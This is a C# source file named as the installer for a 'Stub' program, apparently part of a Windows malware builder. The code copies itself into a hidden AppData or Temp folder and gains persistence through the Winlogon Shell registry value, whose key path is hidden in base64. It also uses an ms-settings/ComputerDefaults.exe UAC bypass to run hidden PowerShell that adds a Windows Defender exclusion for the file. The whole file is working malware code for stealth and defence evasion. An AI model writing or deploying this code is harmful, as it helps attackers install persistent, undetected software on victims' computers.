using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub
{

    public static class Installer
    {

        static public FileInfo FileName;

        static public DirectoryInfo DirectoryName;
        public static void Run(string path, string folder, string filename, string wdex)
        {

            FileName = new FileInfo(filename);

            if (path == "0")
                DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folder));
            if (path == "1")
                DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), folder));
            if (path == "2")
                DirectoryName = new DirectoryInfo(Path.Combine(Path.GetTempPath(), folder));

            if (!IsInstalled())
            {
                try
                {

                    CreateDirectory();

                    InstallFile();

                    InstallRegistry();

                    if (wdex == "True")
                        try
                        { 
                        ExclusionWD();
                        }
                        catch { }
                }
                catch { }
            }
        }

        public static bool IsInstalled()
        {
            if (Application.ExecutablePath == Path.Combine(DirectoryName.FullName, FileName.Name))
                return true;
            else
                return false;
        }

        public static void CreateDirectory()
        {
            if (!DirectoryName.Exists)
            DirectoryName.Create();
            DirectoryName.Attributes = FileAttributes.Hidden;
        }

        public static void InstallFile()
        {
            string fullPath = Path.Combine(DirectoryName.FullName, FileName.Name);
            if (FileName.Exists)
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.MainModule.FileName == fullPath) process.Kill();
                    }
                    catch { }
                }
                File.Delete(fullPath);
                Thread.Sleep(250);
            }
            using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
            {
                byte[] b = File.ReadAllBytes(Application.ExecutablePath);
                fs.Write(b, 0, b.Length);
            }
        }

        public static void InstallRegistry()
        {


            if (GetRegKey() == null)
            {

                byte[] data = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
                string decode = Encoding.UTF8.GetString(data);

                RegistryKey key = Registry.CurrentUser.CreateSubKey(@decode);

                key.SetValue("Shell", "explorer.exe, " + Path.Combine(DirectoryName.FullName, FileName.Name));
                key.Close();
            }
            else
            {

                if (!GetRegKey().Contains(Path.Combine(DirectoryName.FullName, FileName.Name)))
                {

                    string setValue = GetRegKey().Substring(GetRegKey().Length - 1, 1);

                    if (setValue == ",")
                    {
                        setValue = GetRegKey() + Path.Combine(DirectoryName.FullName, FileName.Name) + ",";
                    }
                    else
                    {
                        setValue = GetRegKey() + "," + Path.Combine(DirectoryName.FullName, FileName.Name) + ",";
                    }

                    byte[] data = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=");
                    string decode = Encoding.UTF8.GetString(data);

                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@decode, true).SetValue("Shell", setValue);
                }
            }
       }

        public static void ExclusionWD()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                key.SetValue("", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command Add-MpPreference -ExclusionPath " + (char)39 + Path.Combine(DirectoryName.FullName, FileName.Name) + (char)39);
                key.Close();

                RegistryKey key2 = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                key2.SetValue("DelegateExecute", "");
                key2.Close();

                Process.Start(@"C:\Windows\System32\ComputerDefaults.exe");

                System.Threading.Thread.Sleep(1000);
            }
            catch
            {
            }
        }

        public static string GetRegKey()
        {
            try
            {
                byte[] data = Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25c");
                string decode = Encoding.UTF8.GetString(data);

                RegistryKey key = Registry.CurrentUser.OpenSubKey(@decode);
                return key.GetValue("Shell").ToString();
            }
            catch
            {
                return null;
            }
        }

    }

}


